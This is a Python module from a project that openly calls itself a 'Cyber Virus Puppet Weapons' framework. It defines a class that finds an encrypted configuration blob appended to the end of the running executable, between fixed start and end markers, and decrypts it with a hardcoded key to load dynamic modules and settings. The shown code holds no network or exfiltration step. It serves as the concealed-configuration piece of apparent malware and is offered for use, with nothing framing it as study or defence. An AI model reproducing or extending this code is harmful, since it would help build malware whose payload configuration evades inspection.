# -*- Config : UTF-8 -*-
# Project Name: Termination Generally Use Cyber Virus Puppet Weapons - TLib/T_CDLL
# Version: 4.2.0
# Build Version: ./TConfig/version.ini
# Author: Veyra
# Description:

# Due to the insufficient number of internal modules, debugging requirements,
# And active change configuration requirements,
# Encrypted data is added at the end of the exe to realize dynamic modules, configuration, and debugging.


from .T_imports import *
from .T_FIO import FIO
from .T_GodKeys import GodKeys


class EXEConfig:
    def __init__(self, master: 'Termination4.Termination', FilePath: str, FileBytes: bytes | None = None):
        self.master: 'Termination4.Termination' = master
        self.FilePath: str = FilePath
        self.FileBytes: bytes = FileBytes
        self.__init_values__()
    def __init_values__(self):
        self.GodKeys: GodKeys = GodKeys(b"EXMODECONFIGKEYS"*2)
        try:
            try: self.File: bytes = FIO.openr(self.FilePath, 2)
            except: self.File: bytes = self.FileBytes
            self.FileBytes: bytes = self._Search(self.File, b"EXMODECONFIGSTART", b"EXMODECONFIGEND")
            self.Config: dict = self.GodKeys.decrypt(self.FileBytes)
        except: return
    def Is(self):
        return hasattr(self, "Config") and self.Config and dict == type(self.Config)
    def GetConfig(self, key):
        try:
            if key in self.Config:
                return self.Config[key]
        except: pass
        return None
    def _Search(self, b, s, e):
        m: re.Pattern = re.compile(s+rb"(.*)"+e).search(b)
        if not m: return False
        return m.group(1)